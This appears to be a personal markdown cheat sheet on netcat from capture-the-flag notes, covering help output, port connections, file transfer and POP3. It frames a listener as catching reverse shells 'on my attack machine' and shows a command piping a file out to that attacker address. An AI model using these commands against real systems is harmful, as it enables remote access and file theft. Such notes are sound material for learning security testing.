# netcat

There isn't much that netcat can't do. It allows different types of communication between devices, open shells on remove machines or something simple like get http from a server. I use it often to send and receive data between machines.

## Usage

Running `nc -h` provided the following output:

```bash
OpenBSD netcat (Debian patchlevel 1.206-1ubuntu1)
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
	  [-m minttl] [-O length] [-P proxy_username] [-p source_port]
	  [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
	  [-X proxy_protocol] [-x proxy_address[:port]] 	  [destination] [port]
	Command Summary:
		-4		Use IPv4
		-6		Use IPv6
		-b		Allow broadcast
		-C		Send CRLF as line-ending
		-D		Enable the debug socket option
		-d		Detach from stdin
		-F		Pass socket fd
		-h		This help text
		-I length	TCP receive buffer length
		-i interval	Delay interval for lines sent, ports scanned
		-k		Keep inbound sockets open for multiple connects
		-l		Listen mode, for inbound connects
		-M ttl		Outgoing TTL / Hop Limit
		-m minttl	Minimum incoming TTL / Hop Limit
		-N		Shutdown the network socket after EOF on stdin
		-n		Suppress name/port resolutions
		-O length	TCP send buffer length
		-P proxyuser	Username for proxy authentication
		-p port		Specify local port for remote connects
		-q secs		quit after EOF on stdin and delay of secs
		-r		Randomize remote ports
		-S		Enable the TCP MD5 signature option
		-s source	Local source address
		-T keyword	TOS value
		-t		Answer TELNET negotiation
		-U		Use UNIX domain socket
		-u		UDP mode
		-V rtable	Specify alternate routing table
		-v		Verbose
		-W recvlimit	Terminate after receiving a number of packets
		-w timeout	Timeout for connects and final net reads
		-X proto	Proxy protocol: "4", "5" (SOCKS) or "connect"
		-x addr[:port]	Specify proxy address and port
		-Z		DCCP mode
		-z		Zero-I/O mode [used for scanning]
	Port numbers can be individual or ranges: lo-hi [inclusive]
```

## Connecting

Now and then I'll use netcat to connect to a port on a machine. Usually this happens when I am trying to figure out what is running on the given port. As an example, I am going to connect to the machine at 10.10.1.1 on port 1337. The syntax is very simple:

`nc 10.10.1.1 1337`

From here you can start typing to see how the port handles the message. It varies based on what is listening on that port.

## Listening

This is by far the most common use I have for netcat. I will list on my attack machine so that I can get a reverse shell onto the machine I am attacking. Here is the syntax:

`nc -lvnp 4444`

Here is what the command is doing:

- The `-l` option tells netcat to listen.
- The `-v` option tells netcat to be in verbose mode.
- The `-n` option tells netcat to supress name/port resolutions.
- The `-p` option tells netcat what port to listen on. In this case 4444.

This will output something like the following:

`Listening on 0.0.0.0 4444`

When someone connects, the terminal reads something like the following:

`Connection received on 10.10.1.1 33032`

From here, I can generate a stable shell.

## Sending a File

Netcat has the ability to also send files between machines. I will show how to receive and send a file using netcat. The syntax is very easy. In this example I am sending the secrets.txt to my attack machine that has an ip address of 10.10.1.1.

### Receiver

I need to setup the receiver first. Here is the syntax:

`nc -lp 4444 -q 5 > output.txt < /dev/null`

Here is a explaination about the command:

- The `-l` option tells netcat to listen.
- The `-p` option tells netcat what port to listen on. In this case 4444.
- The `-q` option tells netcat to wait for 5 seconds after the EOF (end of file) is sent.
- The `> output.txt` will save the text from netcat into the output.txt file.
- The `< /dev/null` will send an EOF to the command since we don't want to provide any input from our side.

### Sender

The sending is even easier than the above command. Here is the syntax:

`cat output.txt | nc 10.10.1.1 4444`

Cat will grab the text in output.txt and send it to my attack machine on port 4444.

## POP3

Netcat is the tool I use when interacting with POP3. I have a write up that details interacting with [pop3](../services/pop3.md) in my services section. It covers the some of the more common scenarios that I have found during capture the flag events.

All the examples and interactions use netcat.
